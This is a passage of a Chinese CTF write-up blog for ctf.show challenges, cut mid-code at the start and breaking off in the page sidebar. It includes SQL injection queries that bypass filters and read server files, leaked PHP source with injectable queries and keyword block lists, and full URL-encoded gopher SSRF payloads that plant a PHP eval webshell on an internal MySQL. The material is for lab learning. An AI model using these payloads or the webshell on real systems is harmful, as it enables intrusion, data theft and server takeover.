class="number">222</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">222</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3333</span>:</span><br><span class="line">            <span class="keyword">echo</span> $url;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">44444</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">555555</span>:</span><br><span class="line">            <span class="keyword">echo</span> $url;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6000000</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;$url&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>

<p>既然有<code>sleep</code>函数, 那么要想得到flag, 那肯定是去访问一个时间特别大的, 可以看到 555555 和 6000000 url  是用双引号包裹的, 那么问题就是如何去绕过<code>sleep</code> 函数</p>
<p><code>6e06</code> =&gt; 6000000, 没有结果, 既然前面有intval函数处理 试了之后还是不行,网上随便一搜找到wp</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/104373112">https://blog.csdn.net/miuzzx/article/details/104373112</a></p>
<blockquote>
<p>php 的switch 语句, 不加break会一直执行下去，直到结束或者遇到break</p>
</blockquote>
<p>输入 c=3 得到一个新的页面 here_1s_your_f1ag.php</p>
<p>访问这个页面, 得到一个弹窗admin, 查看源码发现注释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#39;&#x2F;information_schema\.tables|information_schema\.columns|linestring| |polygon&#x2F;is&#39;, $_GET[&#39;query&#39;]))&#123;</span><br><span class="line">		die(&#39;@A@&#39;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>反引号注入</li>
</ul>
<p><strong>反引号：它是为了区分MYSQL的保留字与普通字符而引入的符号</strong></p>
<p><strong>例如information_schema.tables和</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema.&#96;tables&#96;</span><br></pre></td></tr></table></figure>

<p>都可以使用</p>
<p>注意, 这里<code>| |</code> 是过滤空格, 我这里就是看丢了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query&#x3D;-1&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;1</span><br></pre></td></tr></table></figure>

<p>没有报错, 说明只有一个可以回显的位置</p>
<p>查询数据库为 web</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;database()</span><br></pre></td></tr></table></figure>

<p>查数据库中的表为 content</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.&#96;tables&#96;&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;%27web%27</span><br></pre></td></tr></table></figure>

<p>查字段为 id ,username, password</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.&#96;columns&#96;&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;%27content%27</span><br></pre></td></tr></table></figure>

<p>查具体的数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(id,username,password)&#x2F;**&#x2F;from&#x2F;**&#x2F;content</span><br></pre></td></tr></table></figure>

<p>得到这个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(&#39;1adminflag is not here!,2gtf1ywow,you can really dance,3Wowtell you a secret,secret has a secret...&#39;)</span><br></pre></td></tr></table></figure>

<p>读取secret.php文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;load_file(%27&#x2F;var&#x2F;www&#x2F;html&#x2F;secret.php%27)</span><br></pre></td></tr></table></figure>

<p>得到如下代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">&#x27;here_1s_your_f1ag.php&#x27;</span>;</span><br><span class="line">$file = <span class="string">&#x27;/tmp/gtf1y&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(trim(@file_get_contents($file)) === <span class="string">&#x27;ctf.show&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/real_flag_is_here&#x27;</span>);</span><br><span class="line">&#125;<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>这里判断<code>/tmp/gtf1y</code> 这个文件中的内容是比赛<code>ctf.show</code> 是的话就输出<code>/real_flag_is_here</code> 这个文件中的flag, 直接读取就行了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;load_file(%27&#x2F;real_flag_is_here%27)</span><br></pre></td></tr></table></figure>

<p>这波姿势学习到了!!!</p>
<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><ul>
<li><a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 泄露</li>
<li>代码审计</li>
</ul>
<p>在<code>admin/login.php</code> 中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$login_data[<span class="string">&#x27;admin_user&#x27;</span>]=$user;</span><br><span class="line">            $login_data[<span class="string">&#x27;admin_pass&#x27;</span>]=sha1(md5($pass) . LOGIN_KEY);</span><br></pre></td></tr></table></figure>

<p>另一处</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">&#x27;islogin&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">            $_SESSION[<span class="string">&#x27;admin_user&#x27;</span>] = base64_encode($user);</span><br><span class="line">            $_SESSION[<span class="string">&#x27;admin_pass&#x27;</span>] = sha1(md5($pass) . LOGIN_KEY);</span><br></pre></td></tr></table></figure>

<p>这里这个<code>LOGIN_KEY</code> 在 <code>include\common.php</code> 中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">&#x27;LOGIN_KEY&#x27;</span>, <span class="string">&#x27;qweasdzxc5&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>感觉有用, 就先留着吧</p>
<p>在<code>/admin/pass.php</code> 中</p>
<p>是一个修改密码的功能页面</p>
<p>感觉是一个逻辑漏洞, 需要一个普通账号来登陆的那种… 源码反正我下载下来了, 以后再来审吧</p>
<h1 id="36D练手赛"><a href="#36D练手赛" class="headerlink" title="36D练手赛"></a>36D练手赛</h1><h2 id="easyshell"><a href="#easyshell" class="headerlink" title="easyshell"></a>easyshell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass --&gt;</span><br></pre></td></tr></table></figure>





<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Misc签到题"><a href="#Misc签到题" class="headerlink" title="Misc签到题"></a>Misc签到题</h2><ul>
<li>压缩包文件头缺失</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200412210243.png"></p>
<p>修改文件头, 虽然什么CRC验证失败, 不影响打开文件</p>
<p>常见文件头: </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200412210418.png"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Laurel_60/article/details/82154712">https://blog.csdn.net/Laurel_60/article/details/82154712</a></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="密码学签到"><a href="#密码学签到" class="headerlink" title="密码学签到"></a>密码学签到</h2><h2 id="c2"><a href="#c2" class="headerlink" title="c2"></a>c2</h2><p>jsfuck , console</p>
<h2 id="c3"><a href="#c3" class="headerlink" title="c3"></a>c3</h2><p>aaencode, console</p>
<p>flag{js_da_fa_hao}</p>
<h2 id="c4"><a href="#c4" class="headerlink" title="c4"></a>c4</h2><p>已知 p q e 求逆元</p>
<p>flag{53616899001}</p>
<h1 id="内部赛"><a href="#内部赛" class="headerlink" title="内部赛"></a>内部赛</h1><h2 id="web-1"><a href="#web-1" class="headerlink" title="web_1"></a>web_1</h2><ul>
<li><a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 泄露</li>
</ul>
<p>login.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$arr</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/load|and|or|\||\&amp;|select|union|\&#x27;|=| |\\\|,|sleep|ascii/i&quot;</span>,$arr))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;bad hacker!&#x27;)&lt;/script&gt;&quot;</span>; <span class="comment">// 新增过滤Union 单引号等</span></span><br><span class="line">           <span class="keyword">die</span>();   </span><br><span class="line">       &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;db.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;e&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;p&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$e=$_POST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$p=$_POST[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line">$sql =<span class="string">&quot;select username from test1 where email=&#x27;$e&#x27; and password=&#x27;$p&#x27;&quot;</span>; <span class="comment">// 有单引号包裹</span></span><br><span class="line"><span class="keyword">if</span>(check($e)&amp;&amp;check($p))&#123;</span><br><span class="line">$result=mysqli_query($con,$sql);</span><br><span class="line">$row = mysqli_fetch_assoc($result);</span><br><span class="line">    <span class="keyword">if</span>($row)&#123; </span><br><span class="line">		$_SESSION[<span class="string">&#x27;u&#x27;</span>]=$row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		header(<span class="string">&#x27;location:user.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Wrong username or password&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>user.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;db.php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;u&#x27;</span>])&#123;</span><br><span class="line">$username=$_SESSION[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_numeric($username))</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="keyword">if</span>(strlen($username)&gt;<span class="number">10</span>) &#123;</span><br><span class="line">			$username=substr($username,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Hello $username,there&#x27;s nothing here but dog food!&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;The username can only be a number.How did you get here?go out!!!&#x27;);location.href=&#x27;login.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Login first!&#x27;);location.href=&#x27;login.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>register.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$arr</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/load|and|\||\&amp;| |\\\|sleep|ascii|if/i&quot;</span>,$arr))&#123; <span class="comment">// 过滤掉一些盲注</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;bad hacker!&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">           <span class="keyword">die</span>();   </span><br><span class="line">       &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;db.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;e&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;u&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;p&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$e=$_POST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$u=$_POST[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line">$p=$_POST[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line">$sql =</span><br><span class="line"><span class="string">&quot;insert into test1</span></span><br><span class="line"><span class="string">set email = &#x27;$e&#x27;, </span></span><br><span class="line"><span class="string">username = &#x27;$u&#x27;,</span></span><br><span class="line"><span class="string">password = &#x27;$p&#x27;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(check($e)&amp;&amp;check($u)&amp;&amp;check($p))&#123;</span><br><span class="line"><span class="keyword">if</span>(mysqli_query($con, $sql))</span><br><span class="line">&#123;</span><br><span class="line">header(<span class="string">&#x27;location:login.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="红包题"><a href="#红包题" class="headerlink" title="红包题"></a>红包题</h1><h2 id="红包题第九弹"><a href="#红包题第九弹" class="headerlink" title="红包题第九弹"></a>红包题第九弹</h2><ul>
<li>SSRF gopher 协议打内网未授权mysql</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://coomrade.github.io/2018/10/28/SSRF%E6%94%BB%E5%87%BBMySQL/">https://coomrade.github.io/2018/10/28/SSRF%E6%94%BB%E5%87%BBMySQL/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/">https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/</a></p>
<p>MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。<br>* 当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证<br>* 当无需密码认证时直接发送TCP/IP数据包即可</p>
<p><strong>所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。</strong></p>
<p>题目描述: </p>
<blockquote>
<p>由于出现权限问题，取消了mysql密码，端口还 原为3306</p>
</blockquote>
<p>由题目描述可以知道, 这里mysql 服务器应该是没有密码的, 端口为3306</p>
<ul>
<li>抓包,发现带了一个reurl参数, 改为baidu.com, 可以看到我们成功的访问了百度,说明这里可能存在SSRF</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200412231538.png"></p>
<ul>
<li>验证SSRF</li>
</ul>
<p>用自己的vps 监听, 题目靶机访问 , 来验证</p>
<ul>
<li>生成payload</li>
</ul>
<p>因为是第一次打, 需要修改一些东西</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user set password&#x3D;password(&#39;&#39;) where user&#x3D;root;</span><br></pre></td></tr></table></figure>

<p>我的kali 不能实现无密码登陆, 因此我这里劝退了.我用vps 也无法使用</p>
<p>明天问问那个大师傅吧..Orz</p>
<p>我还是说说思路吧, 主要是利用了GitHub上的一个工具 本地kali上监听, 写一个一句话在<code>/var/www/html</code> 目录下, 将监听得到的payload 通过gopher 协议打内网</p>
<p><code>gopher://127.0.0.1/_payload</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200413154336.png"></p>
<p>得到payload, 不过因为浏览器会自动进行一次URL编码接收数据的时候会进行一次url解码, 所以需要再进行一次url编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%a4%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%6d%79%73%71%6c%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%01%00%00%00%01</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%25%61%34%25%30%30%25%30%30%25%30%31%25%38%35%25%61%36%25%66%66%25%30%31%25%30%30%25%30%30%25%30%30%25%30%31%25%32%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%30%30%25%30%30%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%35%66%25%36%65%25%36%31%25%37%34%25%36%39%25%37%36%25%36%35%25%35%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34%25%30%30%25%36%36%25%30%33%25%35%66%25%36%66%25%37%33%25%30%35%25%34%63%25%36%39%25%36%65%25%37%35%25%37%38%25%30%63%25%35%66%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%30%38%25%36%63%25%36%39%25%36%32%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%30%34%25%35%66%25%37%30%25%36%39%25%36%34%25%30%35%25%33%32%25%33%37%25%33%32%25%33%35%25%33%35%25%30%66%25%35%66%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%35%66%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%30%36%25%33%35%25%32%65%25%33%37%25%32%65%25%33%32%25%33%32%25%30%39%25%35%66%25%37%30%25%36%63%25%36%31%25%37%34%25%36%36%25%36%66%25%37%32%25%36%64%25%30%36%25%37%38%25%33%38%25%33%36%25%35%66%25%33%36%25%33%34%25%30%63%25%37%30%25%37%32%25%36%66%25%36%37%25%37%32%25%36%31%25%36%64%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%30%35%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%34%36%25%30%30%25%30%30%25%30%30%25%30%33%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%32%32%25%33%63%25%33%66%25%37%30%25%36%38%25%37%30%25%32%30%25%36%35%25%37%36%25%36%31%25%36%63%25%32%38%25%32%34%25%35%66%25%35%30%25%34%66%25%35%33%25%35%34%25%35%62%25%33%31%25%35%64%25%32%39%25%33%62%25%33%66%25%33%65%25%32%32%25%32%30%25%36%39%25%36%65%25%37%34%25%36%66%25%32%30%25%36%66%25%37%35%25%37%34%25%36%36%25%36%39%25%36%63%25%36%35%25%32%30%25%32%32%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%66%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30%25%32%32%25%33%62%25%30%31%25%30%30%25%30%30%25%30%30%25%30%31</span><br></pre></td></tr></table></figure>

<p>然后用蚁剑连接, 拿flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200413154334.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200413154335.png"></p>
<h1 id="CTFshow-web1"><a href="#CTFshow-web1" class="headerlink" title="CTFshow web1"></a>CTFshow web1</h1><p><a href="mailto:&#102;&#x6c;&#97;&#x67;&#x40;&#x63;&#x74;&#x66;&#x2e;&#115;&#x68;&#111;&#119;">&#102;&#x6c;&#97;&#x67;&#x40;&#x63;&#x74;&#x66;&#x2e;&#115;&#x68;&#111;&#119;</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">m0nk3y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hack-for.fun/ecb0.html">https://hack-for.fun/ecb0.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/null" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/74de.html"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">HexionCTF2020 复现</div></div></a></div><div class="next-post pull-right"><a href="/c4de.html"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">百度杯Writeup</div></div></a></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/null" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">m0nk3y</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">97</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">81</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">22</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas 